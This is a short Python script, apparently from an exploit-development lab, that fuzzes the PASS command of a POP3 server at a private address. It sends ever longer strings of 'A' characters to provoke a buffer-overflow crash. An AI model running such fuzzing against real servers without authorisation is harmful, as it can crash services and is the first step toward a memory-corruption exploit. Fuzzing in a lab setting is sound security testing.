#!/usr/bin/python
# -*- coding: utf-8 -*-
__author__ = 'xy'

import socket

buffer = ['A']
couter = 100
while len(buffer) <= 30:
    buffer.append('A' * couter)
    couter = couter + 200

for string in buffer:
    print('Fuzzing PASS with %s bytes' % len(string))
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    connct = s.connect(('192.168.20.32', 110))
    s.recv(1024)
    s.send('USER test' + '\r\n')
    s.recv(1024)
    s.send('PASS ' + string + '\r\n')
    s.send('QUIT\r\n')
    s.close()
